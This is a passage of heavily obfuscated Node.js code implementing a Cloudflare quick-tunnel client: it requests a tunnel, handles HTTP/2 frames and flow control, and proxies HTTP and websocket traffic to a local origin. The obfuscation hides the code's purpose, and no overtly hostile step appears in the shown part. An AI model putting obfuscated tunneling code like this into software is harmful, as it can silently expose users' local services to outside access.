                            return m !== n;
                        },
                        'JBiId': hE(0xefa),
                        'kUjWB': b[hE(0x1da)],
                        'MjnHt': function (m, n) {
                            return m(n);
                        },
                        'hzTGu': b[hE(0x3c6)],
                        'Jlfui': function (m, n) {
                            const hI = hE;
                            return b[hI(0x4e8)](m, n);
                        },
                        'pnGmM': b[hE(0x95e)]
                    }, l = [];
                j['on'](b[hE(0x5f2)], m => l[hE(0x59a)](m)), j['on'](b[hE(0x510)], d), j['on'](b[hE(0x8a4)], () => {
                    const hJ = hE, m = Buffer[hJ(0x7b6)](l), n = j['statusCode'];
                    let o;
                    try {
                        o = JSON[hJ(0x766)](m['toString'](k[hJ(0x3a9)]));
                    } catch (q) {
                        k[hJ(0x76a)](d, new Error(k[hJ(0xbd0)](k[hJ(0xc56)](k['EyBbT'](k[hJ(0x85a)], n), k[hJ(0x125)]), m[hJ(0x3d1)](0x0, 0x12c)['toString'](k[hJ(0x3a9)]))));
                        return;
                    }
                    const p = o[hJ(0x729)] || {};
                    if (!(o[hJ(0xc42)] ?? !![]) || !p) {
                        k[hJ(0xed5)](d, new Error(k[hJ(0x872)](k[hJ(0x843)], JSON[hJ(0xbbe)](o[hJ(0x75a)]))));
                        return;
                    }
                    try {
                        const r = k[hJ(0x950)](String, p['id']);
                        if (!a0bl[hJ(0xdbb)](r))
                            throw new Error(k['EmWgk']);
                        if (k[hJ(0x491)](typeof p[hJ(0x558)], hJ(0xefa)) || k[hJ(0x491)](typeof p[hJ(0x1de)], k['JBiId']))
                            throw new Error(k[hJ(0xe2e)]);
                        const s = k['MjnHt'](a0bk, p[hJ(0x1cb)]), t = Buffer[hJ(0x58d)](r['replace'](/-/g, ''), k[hJ(0x5e9)]);
                        k['DXLhK'](c, [
                            p[hJ(0x1de)],
                            p['account_tag'],
                            s,
                            t
                        ]);
                    } catch (u) {
                        d(new Error(k['Jlfui'](k['pnGmM'], u[hJ(0xf18)])));
                    }
                });
            });
        h['on'](b[hD(0x510)], j => d(new Error('requesting\x20quick\x20tunnel\x20failed:\x20' + j['message']))), h[hD(0x65c)]();
    });
}
function a0bn(a) {
    const hK = a0d0;
    return a[hK(0x9c5)](([b, c]) => Buffer[hK(0x58d)](b, hK(0x132))['toString']('base64')[hK(0xde0)](/=+$/, '') + ':' + Buffer[hK(0x58d)](c, 'utf8')[hK(0xa27)](hK(0xc75))[hK(0xde0)](/=+$/, ''))['join'](';');
}
class a0bo {
    constructor(a) {
        const hL = a0d0, b = {
                'pAHFA': hL(0x755),
                'uIGxG': 'end'
            };
        this[hL(0x274)] = a, this['buffer'] = Buffer[hL(0xacf)](0x0), this[hL(0xc76)] = [], this['errored'] = null, this[hL(0x85c)] = ![], a['on'](hL(0x426), c => {
            const hM = hL;
            this[hM(0xb8e)] = this[hM(0xb8e)][hM(0x615)] ? Buffer[hM(0x7b6)]([
                this[hM(0xb8e)],
                c
            ]) : c, this['_drain']();
        }), a['on'](b[hL(0xc68)], c => {
            const hN = hL;
            this[hN(0xa21)] = c, this[hN(0x360)]();
        }), a['on'](b[hL(0x368)], () => {
            const hO = hL;
            this[hO(0x85c)] = !![], this['_drain']();
        }), a['on'](hL(0xd81), () => {
            this['closed'] = !![], this['_drain']();
        });
    }
    ['_drain']() {
        const hP = a0d0, a = {
                'WisNr': function (b, c) {
                    return b > c;
                },
                'KUYCx': function (b, c) {
                    return b >= c;
                },
                'AfZxJ': function (b, c) {
                    return b !== c;
                },
                'pqlIr': hP(0xe0f)
            };
        while (a[hP(0xb35)](this[hP(0xc76)][hP(0x615)], 0x0)) {
            const b = this['waiters'][0x0];
            if (a[hP(0xf24)](this[hP(0xb8e)][hP(0x615)], b[hP(0xb5c)])) {
                this[hP(0xc76)][hP(0x99b)]();
                const c = this['buffer'][hP(0x3d1)](0x0, b[hP(0xb5c)]);
                this[hP(0xb8e)] = this['buffer'][hP(0x3d1)](b['need']), b[hP(0x983)](c);
            } else {
                if (a[hP(0x310)](this[hP(0xa21)], null))
                    this[hP(0xc76)][hP(0x99b)](), b['reject'](this[hP(0xa21)]);
                else {
                    if (this[hP(0x85c)])
                        this[hP(0xc76)][hP(0x99b)](), b[hP(0x73e)](new Error(a[hP(0x691)]));
                    else
                        break;
                }
            }
        }
    }
    [a0d0(0xb62)](a) {
        const hQ = a0d0, b = {
                'LvOlx': function (c, d) {
                    return c !== d;
                },
                'eEfyt': hQ(0xe0f)
            };
        if (b['LvOlx'](this['errored'], null))
            return Promise[hQ(0x73e)](this[hQ(0xa21)]);
        if (this['buffer'][hQ(0x615)] >= a) {
            const c = this[hQ(0xb8e)]['subarray'](0x0, a);
            return this[hQ(0xb8e)] = this['buffer'][hQ(0x3d1)](a), Promise['resolve'](c);
        }
        if (this[hQ(0x85c)])
            return Promise['reject'](new Error(b['eEfyt']));
        return new Promise((d, f) => {
            const hR = hQ;
            this['waiters'][hR(0x59a)]({
                'need': a,
                'resolve': d,
                'reject': f
            }), this['_drain']();
        });
    }
}
class a0bp {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const hS = a0d0, l = { 'qLFEu': hS(0xd1) }, m = l['qLFEu'][hS(0xc0)]('|');
        let n = 0x0;
        while (!![]) {
            switch (m[n++]) {
            case '0':
                this['tunnelState'] = k || { 'printed': ![] };
                continue;
            case '1':
                this[hS(0xdc3)] = ![];
                continue;
            case '2':
                this[hS(0xb53)] = [];
                continue;
            case '3':
                this['decoder'] = new a0b3();
                continue;
            case '4':
                this[hS(0x967)] = i;
                continue;
            case '5':
                this['streams'] = new Map();
                continue;
            case '6':
                this[hS(0x9b7)] = c;
                continue;
            case '7':
                this[hS(0x4f6)] = null;
                continue;
            case '8':
                this[hS(0x53f)] = j;
                continue;
            case '9':
                this['streamWindows'] = new Map();
                continue;
            case '10':
                this[hS(0x230)] = 0xffff;
                continue;
            case '11':
                this['connIndex'] = g;
                continue;
            case '12':
                this['tunnelId'] = f;
                continue;
            case '13':
                this['origin'] = b;
                continue;
            case '14':
                this[hS(0x175)] = ![];
                continue;
            case '15':
                this[hS(0x3fd)] = d;
                continue;
            case '16':
                this[hS(0x240)] = ![];
                continue;
            case '17':
                this[hS(0x12f)] = a0aU;
                continue;
            case '18':
                this[hS(0x9e9)] = new a0bo(a);
                continue;
            case '19':
                this['log'] = h;
                continue;
            case '20':
                this['sock'] = a;
                continue;
            }
            break;
        }
    }
    ['sendFrame'](a, b, c, d = Buffer[a0d0(0xacf)](0x0)) {
        const hT = a0d0, f = {
                'NrQHS': hT(0x1dc),
                'zdsMW': function (h, i) {
                    return h & i;
                }
            };
        if (d[hT(0x615)] > 0xffffff)
            throw new Error(f['NrQHS']);
        const g = Buffer[hT(0xacf)](0x9);
        g[hT(0x714)](d['length'], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g[hT(0x16d)](f['zdsMW'](c, 0x7fffffff), 0x5), this[hT(0x2d0)][hT(0x5a6)](Buffer[hT(0x7b6)]([
            g,
            d
        ]));
    }
    [a0d0(0x6ee)](a, b, c = ![]) {
        const hU = a0d0, d = {
                'onorl': function (h, i) {
                    return h(i);
                },
                'qWdKt': function (h, i) {
                    return h | i;
                }
            }, f = d['onorl'](a0b6, b), g = d[hU(0xafe)](0x4, c ? 0x1 : 0x0);
        this[hU(0x7aa)](0x1, g, a, f);
    }
    [a0d0(0xe95)](a) {
        const hV = a0d0, b = {
                'bFzfj': function (c, d) {
                    return c > d;
                },
                'rQDjg': function (c, d) {
                    return c > d;
                }
            };
        if (b[hV(0x699)](this[hV(0x230)], 0x0) && b[hV(0x4c5)](this[hV(0x2e5)][hV(0xb2b)](a) ?? 0xffff, 0x0))
            return Promise['resolve']();
        return new Promise(c => {
            const hW = hV;
            this['windowWaiters'][hW(0x59a)]({
                'streamId': a,
                'resolve': c
            });
        });
    }
    ['_notifyWindows']() {
        const hX = a0d0, a = {
                'aOUqL': function (c, d) {
                    return c > d;
                }
            }, b = [];
        for (const c of this['windowWaiters']) {
            const d = this[hX(0x2e5)][hX(0xb2b)](c[hX(0xc97)]) ?? 0xffff;
            a['aOUqL'](this[hX(0x230)], 0x0) && a['aOUqL'](d, 0x0) ? c['resolve']() : b['push'](c);
        }
        this[hX(0xb53)] = b;
    }
    ['_releaseWaiters']() {
        const hY = a0d0;
        for (const a of this[hY(0xb53)]) {
            a[hY(0x983)]();
        }
        this[hY(0xb53)] = [];
    }
    async ['sendData'](a, b, c = ![]) {
        const hZ = a0d0, d = {
                'xARuo': function (h, i) {
                    return h - i;
                },
                'uJTkp': function (h, i) {
                    return h + i;
                },
                'BNxoL': function (h, i) {
                    return h + i;
                },
                'NYArq': function (h, i) {
                    return h - i;
                },
                'zcPlE': function (h, i) {
                    return h < i;
                }
            }, f = b[hZ(0x615)];
        let g = 0x0;
        do {
            await this[hZ(0xe95)](a);
            if (this[hZ(0x240)])
                return;
            const h = this['streamWindows'][hZ(0xb2b)](a) ?? 0xffff, i = Math[hZ(0xb66)](d[hZ(0x508)](f, g), this[hZ(0x230)], h, this[hZ(0x12f)]), j = c && d[hZ(0xc3b)](g, i) >= f ? 0x1 : 0x0, k = b[hZ(0x3d1)](g, d[hZ(0xb5e)](g, i));
            this[hZ(0x230)] -= i, this[hZ(0x2e5)]['set'](a, d[hZ(0xd94)](h, i)), this[hZ(0x7aa)](0x0, j, a, k), g += i;
        } while (d[hZ(0xc4e)](g, f));
    }
    [a0d0(0xc9c)](a, b) {
        const i0 = a0d0, c = {
                'ututp': function (d, f) {
                    return d > f;
                },
                'VCAHy': function (d, f) {
                    return d & f;
                }
            };
        if (c[i0(0xa31)](b, 0x0)) {
            const d = Buffer[i0(0xacf)](0x4);
            d['writeUInt32BE'](c[i0(0xb5f)](b, 0x7fffffff), 0x0), this[i0(0x7aa)](0x8, 0x0, a, d);
        }
    }
    async [a0d0(0x84f)]() {
        const i1 = a0d0, a = {
                'iTHMj': function (i, j) {
                    return i & j;
                }
            }, b = await this[i1(0x9e9)]['readExact'](0x9), c = b[i1(0xd7)](0x0, 0x3), d = b[0x3], f = b[0x4], g = a['iTHMj'](b[i1(0x4d5)](0x5), 0x7fffffff), h = await this[i1(0x9e9)][i1(0xb62)](c);
        return [
            d,
            f,
            g,
            h
        ];
    }
    async [a0d0(0x986)](a, b, c) {
        const i2 = a0d0, d = {
                'GHOZw': function (g, h) {
                    return g & h;
                },
                'hMwvw': function (g, h) {
                    return g > h;
                },
                'UHXpy': i2(0x923),
                'UOKhM': function (g, h) {
                    return g - h;
                },
                'PMrgj': function (g, h) {
                    return g !== h;
                },
                'KQBTT': i2(0x3d4)
            };
        if (d[i2(0xe99)](a, 0x8)) {
            const g = c[0x0];
            c = c['subarray'](0x1);
            if (d['hMwvw'](g, c[i2(0x615)]))
                throw new Error(d[i2(0xa2b)]);
            c = g ? c[i2(0x3d1)](0x0, d['UOKhM'](c[i2(0x615)], g)) : c;
        }
        a & 0x20 && (c = c['subarray'](0x5));
        const f = [c];
        while (!d[i2(0xe99)](a, 0x4)) {
            const h = await this[i2(0x84f)]();
            if (h[0x0] !== 0x9 || d[i2(0xc4f)](h[0x2], b))
                throw new Error(d['KQBTT']);
            f[i2(0x59a)](h[0x3]), a = h[0x1];
        }
        return this['decoder'][i2(0xe38)](Buffer[i2(0x7b6)](f));
    }
    [a0d0(0x403)](a) {
        const i3 = a0d0, b = {
                'IoZPV': function (c, d) {
                    return c !== d;
                },
                'JkqdS': ':status',
                'qbdoQ': i3(0x628)
            };
        if (b[i3(0x767)](this[i3(0x4f6)], null))
            return;
        this[i3(0x4f6)] = new a0br(this, a, this['log']), this[i3(0x6ee)](a, [[
                b['JkqdS'],
                b['qbdoQ']
            ]]), this['control'][i3(0xb58)](this['accountTag'], this[i3(0x3fd)], this['tunnelId'], this[i3(0x1c5)]);
    }
    ['updateConfig'](a, b) {
        const i4 = a0d0, c = {
                'JbzcR': function (g, h, i) {
                    return g(h, i);
                },
                'chEMY': ':status',
                'STMjh': i4(0x628),
                'BorAh': 'content-type',
                'OKoCN': i4(0xd7a),
                'pBJJb': i4(0x325),
                'HYdIa': function (g, h) {
                    return g(h);
                }
            };
        let d = 0x0;
        try {
            const g = JSON[i4(0x766)](b[i4(0x615)] ? b[i4(0xa27)]('utf8') : '{}'), h = c['JbzcR'](parseInt, g['version'], 0xa);
            !Number['isNaN'](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer[i4(0x58d)](JSON[i4(0xbbe)]({ 'latestAppliedVersion': d }));
        this['sendHeaders'](a, [
            [
                c[i4(0x72d)],
                c[i4(0xa67)]
            ],
            [
                c['BorAh'],
                c[i4(0x4c3)]
            ],
            [
                c[i4(0xd8f)],
                c[i4(0x456)](String, f[i4(0x615)])
            ]
        ]), this[i4(0xc90)](a, f, !![]);
    }
    [a0d0(0x6ce)](a, b) {
        const i5 = a0d0, c = {
                'owCGC': i5(0xb07),
                'ppqOY': function (g, h) {
                    return g === h;
                },
                'NhXeq': i5(0x521)
            }, d = c[i5(0x1a7)]['split']('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                if (b[i5(0x591)])
                    return;
                continue;
            case '1':
                if (c[i5(0x3c2)](b[i5(0x70f)], c[i5(0xc5f)])) {
                    this[i5(0xb67)](a, Buffer[i5(0x7b6)](b[i5(0x72a)]));
                    return;
                }
                continue;
            case '2':
                if (b['websocket'])
                    return;
                continue;
            case '3':
                b[i5(0x591)] = !![];
                continue;
            case '4':
                this[i5(0x4cd)](a, b)['catch'](() => {
                });
                continue;
            }
            break;
        }
    }
    async [a0d0(0x4cd)](a, b) {
        const i6 = a0d0, c = {
                'amBjY': function (d, f, g, h, i, j) {
                    return d(f, g, h, i, j);
                },
                'lwcOb': function (d, f) {
                    return d === f;
                },
                'JZdCv': i6(0x325),
                'wMzCO': 'cf-int-',
                'mTROW': i6(0xbbd),
                'VMsYs': i6(0x500),
                'RHdAW': function (d, f) {
                    return d === f;
                },
                'mkbFg': i6(0xd12),
                'wrMti': function (d, f) {
                    return d === f;
                },
                'lLAVN': i6(0x70f),
                'LCekU': function (d, f) {
                    return d === f;
                },
                'QLuQj': 'sec-websocket-accept',
                'tCPlC': function (d, f) {
                    return d(f);
                },
                'aZgyY': i6(0x70d),
                'Yomnv': i6(0xf02),
                'RgwTZ': i6(0x19f),
                'GEzRh': i6(0x54b),
                'QPNCG': function (d, f) {
                    return d + f;
                },
                'EutgY': function (d, f) {
                    return d + f;
                },
                'yUiad': i6(0x4e4),
                'gprsd': i6(0x85b)
            };
        try {
            const d = await c[i6(0x92d)](a0bu, this[i6(0xf1f)], b[i6(0xae)], b[i6(0xda2)], b['headers'], Buffer[i6(0x7b6)](b[i6(0x72a)])), f = [], g = [];
            for (const [k, l] of d[i6(0xe76)]) {
                const m = k[i6(0x777)]();
                c['lwcOb'](m, c[i6(0x571)]) && g['push']([
                    m,
                    l
                ]);
                const n = m['startsWith'](c['wMzCO']) || m[i6(0x46a)](c['mTROW']) || m[i6(0x46a)](c[i6(0xa60)]) || m['startsWith'](':');
                (!n || c[i6(0x2a8)](m, c[i6(0xde5)]) || c[i6(0x1af)](m, c[i6(0x9ad)]) || c[i6(0xcae)](m, c[i6(0xca1)])) && f[i6(0x59a)]([
                    m,
                    l
                ]);
            }
            if (!f['some'](([o]) => o === i6(0x70d))) {
                const o = c['tCPlC'](a0bj, b[i6(0xda2)]);
                o && f[i6(0x59a)]([
                    c['aZgyY'],
                    o
                ]);
            }
            const h = a0bn(f), i = c[i6(0x9dd)](d[i6(0xab3)], 0x65) ? 0xc8 : d['status'], j = [
                    [
                        c[i6(0x357)],
                        c[i6(0xe7c)](String, i)
                    ],
                    ...g,
                    [
                        c[i6(0xdc)],
                        h
                    ],
                    [
                        i6(0x763),
                        c[i6(0x7b0)]
                    ]
                ];
            this[i6(0x6ee)](a, j);
            for await (const p of d['body']) {
                await this[i6(0xc90)](a, p, ![]);
            }
            await this[i6(0xc90)](a, Buffer[i6(0xacf)](0x0), !![]);
        } catch (q) {
            this[i6(0x6d3)][i6(0xd62)](c[i6(0xcb7)](c['EutgY'](c[i6(0x16e)] + a, c[i6(0x9e0)]), q));
            try {
                this[i6(0x6ee)](a, [[
                        i6(0xf02),
                        i6(0x551)
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async [a0d0(0x550)]() {
        const i7 = a0d0, a = {
                'HMIaa': i7(0x677),
                'aBsgV': i7(0x7e0),
                'GXiLc': function (d, f) {
                    return d + f;
                },
                'ZGErb': function (d, f) {
                    return d % f;
                },
                'uWotC': i7(0xe5a),
                'XvTpg': function (d, f) {
                    return d < f;
                },
                'IrkuD': function (d, f) {
                    return d + f;
                },
                'aJGTA': function (d, f) {
                    return d === f;
                },
                'eFVzX': function (d, f) {
                    return d - f;
                },
                'bRHOH': function (d, f) {
                    return d + f;
                },
                'Qwutu': function (d, f) {
                    return d >= f;
                },
                'EJUoD': function (d, f) {
                    return d <= f;
                },
                'dInxu': function (d, f) {
                    return d & f;
                },
                'uwbsD': function (d, f) {
                    return d === f;
                }
            }, b = await this[i7(0x9e9)][i7(0xb62)](0x18);
        if (!b[i7(0xa7)](Buffer[i7(0x58d)](a[i7(0x37f)])))
            throw new Error(a['aBsgV']);
        const c = Buffer['alloc'](0x6);
        c[i7(0x948)](0x3, 0x0), c['writeUInt32BE'](0x64, 0x2), this[i7(0x7aa)](0x4, 0x0, 0x0, c);
        this[i7(0x53f)] && !this[i7(0x83a)][i7(0xd9f)] && (process[i7(0x9a6)][i7(0x5a6)](a[i7(0x2ef)](this[i7(0x967)], '\x0a')), this[i7(0x83a)][i7(0xd9f)] = !![]);
        try {
            while (!this['stopped']) {
                const [d, f, g, h] = await this[i7(0x84f)]();
                if (d === 0x4) {
                    if (!(f & 0x1)) {
                        if (a[i7(0x842)](h[i7(0x615)], 0x6))
                            throw new Error(a[i7(0x9fd)]);
                        for (let i = 0x0; a['XvTpg'](i, h['length']); i += 0x6) {
                            const j = h['readUInt16BE'](i), k = h[i7(0x4d5)](a[i7(0xec3)](i, 0x2));
                            if (a['aJGTA'](j, 0x4)) {
                                const l = a[i7(0x99a)](k, 0xffff);
                                for (const m of this['streamWindows']['keys']()) {
                                    this[i7(0x2e5)][i7(0x6e7)](m, Math[i7(0x8b4)](0x0, a[i7(0xe6a)](this['streamWindows'][i7(0xb2b)](m), l)));
                                }
                            } else
                                j === 0x5 && a[i7(0x1a3)](k, 0x4000) && a['EJUoD'](k, 0xffffff) && (this[i7(0x12f)] = k);
                        }
                        this[i7(0x7aa)](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (d === 0x6) {
                    !a[i7(0x609)](f, 0x1) && this['sendFrame'](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (a[i7(0xa95)](d, 0x8)) {
                    if (h[i7(0x615)] !== 0x4)
                        continue;
                    const n = h[i7(0x4d5)](0x0) & 0x7fffffff;
                    a[i7(0xa95)](g, 0x0) ? this['connectionWindow'] += n : this[i7(0x2e5)][i7(0x6e7)](g, a[i7(0xec3)](this[i7(0x2e5)][i7(0xb2b)](g) ?? 0xffff, n));
                    this[i7(0x597)]();
                    continue;
                }
                if (a['uwbsD'](d, 0x3)) {
                    this[i7(0x315)]['delete'](g);
                    continue;
                }
                if (a[i7(0xcea)](d, 0x7))
                    break;
                if (d === 0x1) {
                    const o = await this[i7(0x986)](f, g, h);
                    !this[i7(0x2e5)]['has'](g) && this[i7(0x2e5)][i7(0x6e7)](g, 0xffff);
                    this[i7(0x6bb)](g, f, o);
                    continue;
                }
                if (d === 0x0) {
                    this['handleData'](g, f, h);
                    continue;
                }
            }
        } finally {
            this[i7(0x240)] = !![], this[i7(0xb09)]();
            for (const p of this['streams'][i7(0x543)]()) {
                p[i7(0xbe1)] && p[i7(0xbe1)][i7(0x7ef)]();
            }
            try {
                this[i7(0x2d0)][i7(0x4d7)]();
            } catch (q) {
            }
        }
    }
    [a0d0(0x6bb)](a, b, c) {
        const i8 = a0d0, d = {
                'yuPbV': function (i, j) {
                    return i & j;
                },
                'gvBPJ': ':method',
                'uyFWj': 'GET',
                'LFTTW': ':authority',
                'bxbGX': function (i, j) {
                    return i === j;
                },
                'yirxY': i8(0xbcf)
            }, f = {};
        for (const [i, j] of c) {
            i[i8(0x46a)](':') ? f[i] = j : f[i[i8(0x777)]()] = j;
        }
        const g = (f[a0aS] || '')[i8(0x27f)]()[i8(0x777)]();
        if (g === a0aT) {
            this[i8(0x403)](a);
            d['yuPbV'](b, 0x1) && (this['control']['finished'] = !![]);
            return;
        }
        const h = {
            'method': f[d[i8(0x16a)]] || d[i8(0x32d)],
            'path': f[i8(0x198)] || '/',
            'authority': f[d['LFTTW']] || '',
            'headers': c[i8(0x74d)](([k]) => !k['startsWith'](':')),
            'body': [],
            'upgrade': g,
            'websocket': d[i8(0x1f1)](g, d[i8(0xf01)]) || d['bxbGX']((f[':protocol'] || '')['toLowerCase'](), 'websocket'),
            'ended': Boolean(d[i8(0xec1)](b, 0x1)),
            'finished': ![]
        };
        this[i8(0x315)]['set'](a, h);
        if (h[i8(0xbcf)])
            h[i8(0xbe1)] = new a0bq(this, a, h, this[i8(0xf1f)], this[i8(0x6d3)]), h[i8(0xbe1)][i8(0xb58)]();
        else
            h[i8(0xce1)] && this[i8(0x6ce)](a, h);
    }
    [a0d0(0xaf4)](a, b, c) {
        const i9 = a0d0, d = {
                'MNYjj': function (g, h) {
                    return g !== h;
                },
                'zcllN': function (g, h) {
                    return g(h);
                },
                'YbyCQ': function (g, h) {
                    return g & h;
                }
            };
        this[i9(0xc9c)](0x0, c[i9(0x615)]), this[i9(0xc9c)](a, c[i9(0x615)]);
        if (this['control'] !== null && this[i9(0x4f6)][i9(0xc97)] === a) {
            this[i9(0x4f6)][i9(0x753)](c);
            b & 0x1 && (this[i9(0x4f6)]['finished'] = !![]);
            return;
        }
        const f = this['streams'][i9(0xb2b)](a);
        if (f === undefined)
            return;
        if (d['MNYjj'](f['websocketProxy'], undefined)) {
            f[i9(0xbe1)][i9(0x753)](c, d[i9(0x23f)](Boolean, b & 0x1));
            return;
        }
        c[i9(0x615)] && f['body'][i9(0x59a)](c), d[i9(0xa90)](b, 0x1) && (f['ended'] = !![], this[i9(0x6ce)](a, f));
    }
}
class a0bq {
    constructor(a, b, c, d, f) {
        const ia = a0d0, g = { 'jeAqA': ia(0xd9d) }, h = g[ia(0x501)][ia(0xc0)]('|');
        let i = 0x0;
        while (!![]) {
            switch (h[i++]) {
            case '0':
                this[ia(0x240)] = ![];
                continue;
            case '1':
                this[ia(0xc97)] = b;
                continue;
            case '2':
                this[ia(0xd12)] = a;
                continue;
            case '3':
                this['log'] = f;
                continue;
            case '4':
                this[ia(0xb08)] = [];
                continue;
            case '5':
                this[ia(0xc76)] = [];
                continue;
            case '6':
                this[ia(0x6be)] = c;
                continue;
            case '7':
                this[ia(0xf1f)] = d;
                continue;
            case '8':
                this['sock'] = null;
                continue;
            }
            break;
        }
    }
    [a0d0(0xb58)]() {
        const ib = a0d0;
        this['run']()[ib(0xef4)](() => {
        });
    }
    [a0d0(0x753)](a, b = ![]) {
        const ic = a0d0;
        a[ic(0x615)] && this['queue'][ic(0x59a)](a), b && this[ic(0xb08)][ic(0x59a)](null), this[ic(0x9db)]();
    }
    ['stop']() {
        const id = a0d0, a = {
                'obkUk': function (b, c) {
                    return b !== c;
                }
            };
        if (this['stopped'])
            return;
        this[id(0x240)] = !![], this[id(0x9db)]();
        if (a[id(0xd99)](this[id(0x2d0)], null))
            try {
                this[id(0x2d0)][id(0x4d7)]();
            } catch (b) {
            }
    }
    [a0d0(0x9db)]() {
        const ie = a0d0;
        for (const a of this[ie(0xc76)]) {
            a();
        }
        this[ie(0xc76)] = [];
    }
    async ['_next']() {
        const ig = a0d0;
        while (!this['stopped']) {
            if (this[ig(0xb08)]['length'])
                return this['queue']['shift']();
            await new Promise(a => this[ig(0xc76)][ig(0x59a)](a));
        }
        return null;
    }
    async [a0d0(0x550)]() {
        const ih = a0d0, a = {
                'CbInf': function (b, c) {
                    return b(c);
                },
                'PbjgK': function (b, c) {
                    return b === c;
                },
                'GBogl': ih(0x325),
                'YGOuz': ih(0xbbd),
                'RhVWi': ih(0x500),
                'gvAbP': function (b, c) {
                    return b === c;
                },
                'dZkIR': ih(0x70f),
                'gQEIG': function (b, c) {
                    return b === c;
                },
                'asxZF': ih(0x10d),
                'iaKvs': function (b, c) {
                    return b(c);
                },
                'RFTcF': ih(0xf02),
                'GkKAM': ih(0x19f),
                'ZFrNE': ih(0x54b),
                'angxw': function (b, c) {
                    return b + c;
                },
                'tcQFp': 'websocket\x20stream\x20',
                'hvdtr': ih(0x670),
                'jRKFH': '502'
            };
        try {
            this[ih(0x2d0)] = await a0bs(this['origin']), this['sendHandshake']();
            const b = await a[ih(0x4db)](a0bv, this['sock']), c = [], d = [];
            for (const [i, j] of b['headers']) {
                const k = i[ih(0x777)]();
                a[ih(0x92f)](k, a[ih(0x485)]) && d[ih(0x59a)]([
                    k,
                    j
                ]);
                const l = k['startsWith'](ih(0x557)) || k[ih(0x46a)](a['YGOuz']) || k[ih(0x46a)](a['RhVWi']) || k['startsWith'](':');
                (!l || a[ih(0x92f)](k, ih(0xd12)) || a[ih(0x78b)](k, a[ih(0x42f)]) || a[ih(0xe7f)](k, a[ih(0x406)])) && c[ih(0x59a)]([
                    k,
                    j
                ]);
            }
            const f = a[ih(0x35e)](a0bn, c), g = a[ih(0xe7f)](b['status'], 0x65) ? 0xc8 : b['status'], h = [
                    [
                        a['RFTcF'],
                        String(g)
                    ],
                    ...d,
                    [
                        a[ih(0x205)],
                        f
                    ],
                    [
                        'cf-cloudflared-response-meta',
                        a[ih(0xa8)]
                    ]
                ];
            this[ih(0xd12)][ih(0x6ee)](this[ih(0xc97)], h), this[ih(0x9bd)]()[ih(0xef4)](() => {
            }), await this[ih(0x20d)](b[ih(0x349)]);
        } catch (m) {
            this['log']['warning'](a[ih(0x11e)](a['angxw'](a[ih(0x11e)](a[ih(0xcc2)], this['streamId']), a[ih(0x837)]), m));
            try {
                this['connection']['sendHeaders'](this['streamId'], [[
                        a[ih(0x80c)],
                        a[ih(0x20e)]
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this['stop']();
        }
    }
    async [a0d0(0x20d)](a) {
        const ii = a0d0;
        a[ii(0x615)] && await this['connection']['sendData'](this[ii(0xc97)], a, ![]);
        for await (const b of this[ii(0x2d0)]) {
            if (this[ii(0x240)])
                break;
            await this['connection'][ii(0xc90)](this['streamId'], b, ![]);
        }
        !this['stopped'] && await this[ii(0xd12)][ii(0xc90)](this[ii(0xc97)], Buffer[ii(0xacf)](0x0), !![]);
    }
    async [a0d0(0x9bd)]() {
        const ij = a0d0, a = {
                'ULugR': function (b, c) {
                    return b === c;
                }
            };
        while (!this[ij(0x240)]) {
            const b = await this[ij(0x925)]();
            if (a[ij(0x77a)](b, null))
                return;
            try {
                this[ij(0x2d0)][ij(0x5a6)](b);
            } catch (c) {
                this[ij(0x240)] = !![];
                return;
            }
        }
    }
    ['sendHandshake']() {
        const ik = a0d0, a = {
                'DjlXA': function (i, j) {
                    return i + j;
                },
                'xhuiC': function (i, j) {
                    return i + j;
                },
                'mHNDo': function (i, j) {
                    return i + j;
                },
                'zZMmE': ik(0x7f1),
                'umBUP': ik(0xe60),
                'ZyCLW': function (i, j) {
                    return i === j;
                },
                'AgzSl': ik(0xd12),
                'Onqhx': ik(0x70f),
                'IgAyB': function (i, j) {
                    return i === j;
                },
                'AlGuF': ik(0x3b5),
                'ImAOQ': ik(0xf1f),
                'JGcws': function (i, j) {
                    return i + j;
                },
                'jrLBo': ik(0x54c),
                'LPaCF': 'Origin:\x20https://',
                'PyCvN': function (i, j) {
                    return i + j;
                },
                'dUJDk': 'Sec-WebSocket-Key:\x20',
                'qCqZi': ik(0xc75),
                'kbTZo': ik(0x728),
                'KCYdF': 'Connection:\x20Upgrade',
                'MfmIY': ik(0xf7),
                'jxTOz': ik(0x874)
            }, b = new URL(this[ik(0xf1f)]), c = this['request'][ik(0xda2)][ik(0x46a)]('/') ? this[ik(0x6be)]['path'] : a[ik(0x977)]('/', this['request'][ik(0xda2)]), d = [a['xhuiC'](a[ik(0x7a3)](a[ik(0x14c)], c), a[ik(0x33d)])];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this[ik(0x6be)][ik(0xe76)]) {
            const k = i[ik(0x777)]();
            if (a[ik(0x23c)](k, 'host') || k === a[ik(0x1b4)] || k === a[ik(0x3f7)] || a[ik(0x1bb)](k, ik(0x325)) || a[ik(0x23c)](k, ik(0x2ba)))
                continue;
            if (a[ik(0x1bb)](k, ik(0xa7f)))
                f = !![];
            else {
                if (k === a[ik(0x7b3)])
                    g = !![];
                else
                    a[ik(0x1bb)](k, a[ik(0x953)]) && (h = !![]);
            }
            d[ik(0x59a)](a['JGcws'](i, ':\x20') + j);
        }
        d[ik(0x59a)](a[ik(0x9dc)](a['jrLBo'], b[ik(0xc32)])), !h && this['request'][ik(0x244)] && d[ik(0x59a)](a['DjlXA'](a[ik(0xa16)], this[ik(0x6be)]['authority'])), !f && d['push'](a[ik(0x742)](a[ik(0xa15)], a0k[ik(0x91e)](0x10)[ik(0xa27)](a[ik(0x26a)]))), !g && d[ik(0x59a)](a[ik(0xac5)]), d[ik(0x59a)](a[ik(0x661)]), d[ik(0x59a)](a['MfmIY']), this[ik(0x2d0)][ik(0x5a6)](Buffer['from'](a[ik(0x9dc)](d[ik(0x782)]('\x0d\x0a'), a[ik(0x1ec)]), ik(0x80e)));
    }
}
class a0br {
    constructor(a, b, c, d = {}) {
        const il = a0d0, f = { 'NWPSC': il(0xacb) }, g = f[il(0x286)]['split']('|');
        let h = 0x0;
        while (!![]) {
            switch (g[h++]) {
